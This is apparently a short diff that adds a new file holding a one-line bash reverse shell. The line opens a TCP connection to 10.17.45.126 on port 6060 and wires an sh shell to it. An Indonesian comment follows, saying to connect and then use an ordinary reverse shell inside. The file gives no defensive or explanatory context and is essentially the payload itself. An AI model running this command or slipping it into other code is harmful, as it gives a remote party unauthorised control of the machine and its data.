@@ -1,0 +1,4 @@
+0<&196;exec 196<>/dev/tcp/10.17.45.126/6060; sh <&196 >&196 2>&196
+
+
+ke connect terus revshell biasa di dalem
